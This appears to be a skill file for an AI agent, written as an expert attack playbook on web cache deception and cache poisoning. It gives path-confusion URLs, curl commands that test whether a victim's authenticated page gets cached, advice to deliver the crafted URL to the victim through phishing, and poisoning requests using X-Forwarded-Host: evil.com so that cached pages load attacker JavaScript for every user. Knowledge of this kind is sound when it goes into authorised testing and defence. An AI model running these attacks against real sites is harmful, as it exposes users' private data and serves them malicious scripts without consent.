---
name: web-cache-deception
description: 1. CORE CONCEPTS
when-to-use: >-
  Web cache deception and poisoning playbook. Use when CDN, reverse proxy, or application caching may serve sensitive authenticated content to other users due to path confusion or cache key manipulation.
---

# SKILL: Web Cache Deception — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Web cache deception and poisoning techniques. Covers path confusion attacks, CDN cache behavior exploitation, cache key manipulation, and the distinction between cache deception (steal data) and cache poisoning (serve malicious content). Presented by Omer Gil at Black Hat 2017 and significantly expanded since.

### Advanced Reference

Also load [CACHE_POISONING_TECHNIQUES.md](./CACHE_POISONING_TECHNIQUES.md) when you need:
- Web Cache Poisoning vs Web Cache Deception — clear distinction and attack flow comparison
- Unkeyed header poisoning (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, multiple Host headers)
- Unkeyed parameter poisoning (utm_content, fbclid, callback, reflected but not in cache key)
- Fat GET cache poisoning (body parameters reflected but not keyed)
- Parameter cloaking via semicolons and duplicate parameter parsing differentials
- CDN-specific behavior: Cloudflare, CloudFront, Akamai, Varnish, Fastly (cache key composition, debug headers, ESI)
- Vary header manipulation, cache partitioning attacks, and missing Vary vulnerabilities

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION — ATTACK METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

CDNs typically cache by file extension:
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (sometimes)
```

### Step 2: Test Path Confusion

```text
# Append static extension to authenticated endpoint:
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

# Path traversal style:
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
# Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

# Check response headers:
# X-Cache: MISS (first request)
# Age: 0

# Request again as attacker (no auth):
curl https://target.com/account/profile/x.css

# Check response:
# X-Cache: HIT
# Contains victim's authenticated content? → vulnerable
```

### Step 4: Deliver to Victim

Send the crafted URL to victim via phishing, message, or embed:
```
https://target.com/account/profile/tracking.gif
```

---

## 3. CACHE POISONING — ATTACK METHODOLOGY

### Unkeyed Input Discovery

Cache keys typically include: `Host`, URL path, query string.
These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.

```bash
# Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
# If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Cache Poisoning via Host Header

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

The key to cache deception: **CDN and application normalize paths differently**.

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

```text

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
